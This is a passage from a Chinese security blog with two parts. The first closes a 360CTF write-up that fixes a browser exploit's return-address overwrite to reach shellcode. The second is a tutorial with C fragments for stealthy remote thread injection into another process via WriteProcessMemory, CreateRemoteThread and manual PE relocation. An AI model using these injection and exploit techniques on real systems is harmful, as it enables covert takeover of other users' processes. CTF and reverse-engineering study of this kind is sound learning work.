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" alt=""> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAI4AAAB2CAIAAACRXjwrAAAFT0lEQVR4nO2dfUxVZRzHz9+9LFu1ctmqqaVD50toacmOTkvLLDU1TTOztCAgVEBC4YYKSoioKAQKikqalqZOU8vUdJLVorqt91aZzt5cra1/b3+cdjicl+c+995zuHwfvp/9dvfcw/P+ub/zHGAMLdzawoAILdzaEiEI/K8q6R8ZRtRoU3VFr/Qre2dcdccLV/fJvKZvVreU7Gv7vXhd/5zrByy8YeCiGwfn3nRXXvfU/JuHLu5xd8EtwwpvHb7ktnuX3j6iqGdacS891Hvky3eOKukzennfMStSHijtN7as/7iVAx5aNXB8+aAJFYMfWZ06sXLIpDVDJ1fdM2XtsKnrhj9efd/0DSNmbEybWaPPqh05+9VRT9WNnlM/Zu7m+59pGDuvcdz8LQ8+t3V8etPDGdsmZO54NKt5YvZrk3J2PrZg15RFr0/N3T0tb8/0xW/OKNj7ROG+WUveerJo/+ziA3NCB58uOTR32eFnV7w9r/TI/LKjz686ll7+TkbF8czV72VVnsiuOpmz9tSC9e8vrD6du+FMXs3Z/NqWgroPXqo/V7jpw6UNHxU1fly89ZNQU2vJ9k+X7fhsefPnpTvDZbu+WLn7y/I9X73yxtcVe7+p3Pftmv3fVR34ft3BH9Yf+rH68E8bj/xcc/R87bFf6t69UH/84qYTlxpO/tp46rctp39vOvPHtrN/bm+53Hzur7iDqqiKqrxVxXQ+6bpOVclUJXk4hUIhqlJClZl65y9eNstUFZAqTdM0TWv3mGe5Ej2rIpHI3//82y0l2/DErAo0q6xubOakVJnwBtgBN0DNQmxnlenJdlaZ1w1V5tsLl9qeaqgqvrPK6SmGG6Atq4y33VPzjYKRVUa5Z1qxUWBWJSGrvFSZWFUZ8AaYnLPK+VhhZpXtrKKqpD0BmlvvfFh3ZpWpio8VAN8CUxWAKjPD+LAeq6qQNPzBUjJV6TFCVfwlCFV1gCpGJ482VRHSiaEqGKgKBqqCgapgoCoYqAoGqoKBqmCgKhioCgaqgoGqYKAqGKgKBqqCgapgoCoYqAoGqoKBqmCgKhioCoaYVZl/sWW76FrHuK61x1nBtY7rWIJWXvORGUs8ukwdma1LkNhUWafoet217NrKedFWEPQjbi6YnnxBZhWCEYMgTlXO614WvZpH3aMEVcU0lnh0r1V0dlXOlJdcpMwn3fVmEjUpxfORHMt5Z5NZhbiyv8SfVTLZ4NXWtb5zi13feu1p1IyRqROHqo7xFPFLlXX7ElQlaCLZXF6nzPTiqxYEvmVVxPuj6iwLmrv2I98q8YJ45oIVBU2iD+uuZVsd86vOTlxTwdaJazVxP659yowlWKl4FVrw2vgtMAxUBQNVwUBVMFAVDFQFA1XBQFUwUBUMVAUDVcFAVTBQFQxUBQNVwUBVMFAVDFQFA1XBQFUwUBUMVAUDVcFAVTBQFQztVDE6eVAVTFAVTFAVTFAVTFAVTFAVTFAVTFAVTFAVTOCpcv6Rr2IopSo5P4YLHl3XFVSV9Gn4HsY/bKYqgFBflbE2v17FfQYxotmz4qoEC5PsynaYRz3eExxR0KfiqnzcqbBb6oQlHjj9mobiqnzZKWcnrs4k28Y9AcVV+bVNZjmgjJEJxVUlvptWK7Zz3nwb9A2QWSXrSWDFa1uDCMVV+ZJVrq9hjxMrCFXMqnhUeWWVVVVAh5niqjrgrHKqCmJF6qvya5vEqly/6nsorsrHjbN1ZUs160Xf74FdJau80gLrtUuoUiaUVRVSEQVV6eqimiq1UUdVlw2qggmqggmqggmqggmqggmqggmqggmqgon/ABCL9Z1FjySHAAAAAElFTkSuQmCC" alt=""> 直接就出KEY了。。。</p>
<h2 id="修复Exploit-html"><a href="#修复Exploit-html" class="headerlink" title="修复Exploit.html"></a>修复Exploit.html</h2><p>目测是Exploit.html的返回地址覆盖不准确，稍微修改下即可。 修改是沿着调试的方法直接把eip位置改到一个空白的地方，然后将原来的代码修复，抬高栈顶，然后跳入shellcode入口 <img src="data:image/png;base64,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" alt=""> <a href="http://yfcnblog-wordpress.stor.sinaapp.com/uploads/2014/07/Exploit_fixed.html" target="_blank" rel="external">Exploit_fixed</a> 当时比赛的时候和大神最后3小时都在做这道题，其他都没做……结果还没做出来，真是坑爹啊。。。 看小伙伴们在群里交流，自己又拿出来看了看。。。结果- -更坑爹 题目:<a href="http://yfcnblog-wordpress.stor.sinaapp.com/uploads/2014/07/exploit.zip" target="_blank" rel="external">exploit</a></p>

                    
                        
                    
                    
                        <p>
                            <a href="/writeups/2nd-360ctf-reverse5-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/uncategorized/remote-thread-injection-without-dll/">
                            不注入DLL实现远程线程注入
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2014-06-25T23:40:34+08:00">
	
		    Jun 25, 2014
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>通过CreateRemoteThread&amp;WriteProcessMemory实现远程线程注入，没有通过加载DLL注入，有更好的隐蔽性。 参考：<a href="http://www.vckbase.com/index.php/wv/1653/" target="_blank" rel="external">http://www.vckbase.com/index.php/wv/1653/</a></p>
<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a><strong>0x01前言</strong></h1><p>远程线程技术指的是通过在其他进程中创建新线程的方法进入该进程的内存地址空间，从而获得对该进程的控制权的方法。 在进程中可以通过CreateThread函数创建线程，被创建的新线程与主线程共享地址空间以及其他的资源。同样，通过CreateRemoteThread函数可以在其他进程内创建新线程，新创建的的远程线程可以共享远程进程的地址空间。 所以通过在远程进程中创建新的方法，就可以进入到远程进程的内存地址空间，也就拥有了和那个远程进程相当的权限，可以在远程进程中执行代码，从而达到远程进程控制、进程隐藏的目的。</p>
<h1 id="0x02基本原理"><a href="#0x02基本原理" class="headerlink" title="0x02基本原理"></a>0x02基本原理</h1><p><strong>思路:</strong> <strong>将程序自身映像写入远程线程然后进行重定位</strong> <strong>然后创建远程线程调用其中的入口函数</strong> <strong>之后线程运行后先写好AIT</strong> <strong>其实就是手动完成PE loader进行模块导入时重定向和写AIT。</strong> <strong>可以先看实现代码再回头看，实现代码注释比较详细。。</strong></p>
<h3 id="1-OpenProcess获得远程进程句柄"><a href="#1-OpenProcess获得远程进程句柄" class="headerlink" title="1.OpenProcess获得远程进程句柄"></a>1.OpenProcess获得远程进程句柄</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hRemoteProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwProcessID);</div></pre></td></tr></table></figure>
<h3 id="2-VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。"><a href="#2-VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。" class="headerlink" title="2.VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。"></a>2.VirtualAllocEx在远程进程申请空间，申请大小为程序自身映像大小。</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lpInjectPoint = (LPBYTE)VirtualAllocEx(hRemoteProcess, <span class="number">0</span>, dwImageSize, MEM\_COMMIT, PAGE\_EXECUTE_READWRITE);</div></pre></td></tr></table></figure>
<h3 id="3-将程序自身的映像的的重定位并且写入远程线程"><a href="#3-将程序自身的映像的的重定位并且写入远程线程" class="headerlink" title="3.将程序自身的映像的的重定位并且写入远程线程"></a>3.将程序自身的映像的的重定位并且写入远程线程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RelocCode(lpNewMoudle, lpInjectPoint); WriteProcessMemory(hRemoteProcess, lpInjectPoint, lpNewMoudle, dwImageSize, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure>
<h3 id="4-运行远程线程"><a href="#4-运行远程线程" class="headerlink" title="4.运行远程线程"></a>4.运行远程线程</h3><p>得到ThreadEntry在远程进程中的地址，利用函数在模块中的相对地址+注入点地址 lpRemoteEntryPoint = (LPTHREAD_START_ROUTINE)(lpInjectPoint + (DWORD)fnRemoteThread_Main - lpMoudle); 将插入点地址作为参数传递给线程函数 lpParam = lpInjectPoint; 运行远程线程 hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, lpRemoteEntryPoint, lpParam, 0, NULL);</p>
<h3 id="5-远程线程运行的入口函数"><a href="#5-远程线程运行的入口函数" class="headerlink" title="5.远程线程运行的入口函数"></a>5.远程线程运行的入口函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//CreateRemoteThread的线程运行入口</span></div><div class="line"><span class="function">DWORD <span class="title">ThreadEntry</span><span class="params">(LPBYTE  lpImageBase)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (LoadAPI(lpImageBase))<span class="comment">//先完成API函数的导入工作</span></div><div class="line">		RemoteThread\_Main((HINSTANCE)lpImageBase);  <span class="comment">//执行函数RemoteThread\_Main中的代码</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>先运行LoadAPI函数写入AIT，之后调用自己的编写的fnRemoteThread_Main函数执行自己的操作</p>
<h3 id="6-其中的重定位及AIT操作"><a href="#6-其中的重定位及AIT操作" class="headerlink" title="6.其中的重定位及AIT操作"></a>6.其中的重定位及AIT操作</h3><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p>参考<a href="http://hi.baidu.com/_achillis/item/7e324e08db884b94a2df4313" target="_blank" rel="external">http://hi.baidu.com/_achillis/item/7e324e08db884b94a2df4313</a> 重定位表由一个个的重定位块组成，如果重定位表存在的话，必定是至少有一个重定位块。 因为每个块只负责定位0x1000大小范围内的数据，因此如果要定位的数据范围比较大的话， 就会有多个重定位块存在。 每个块的首部是如下定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> \_IMAGE\_BASE_RELOCATION &#123;</div><div class="line">    DWORD   VirtualAddress;</div><div class="line">    DWORD   SizeOfBlock;</div><div class="line">&#125; IMAGE\_BASE\_RELOCATION;</div></pre></td></tr></table></figure>
<p>把内存中需要重定位的数据按页的大小0x1000分为若干个块，而这个VirtualAddress就是每个块的起始RVA.只知道块的RVA当然还不行，我们要知道每一个需要重定位数据的具体地址。 每个需重定位的数据其地址及定位方式用两个字节来表示，记为RelocData，紧跟在IMAGE_BASE_RELOCATION结构之后。</p>
<h4 id="每个块中重定位信息的个数"><a href="#每个块中重定位信息的个数" class="headerlink" title="每个块中重定位信息的个数"></a>每个块中重定位信息的个数</h4><p>这个可由每个块结构中的Size来确定。Size的值是以DWORD表示的当前整个块的大小，先减去IMAGE_BASE_RELOCATION的大小，因为重定位数据是16位WORD的，再除以2，就得到个重定位数据的个数。</p>
<h4 id="遍历每个重定位块"><a href="#遍历每个重定位块" class="headerlink" title="遍历每个重定位块"></a>遍历每个重定位块</h4><p>由Size可以直接到达下一个重定位块即当前块地址+Size 某个块首结构的VirtualAddress为0，表明重定位表结束。</p>
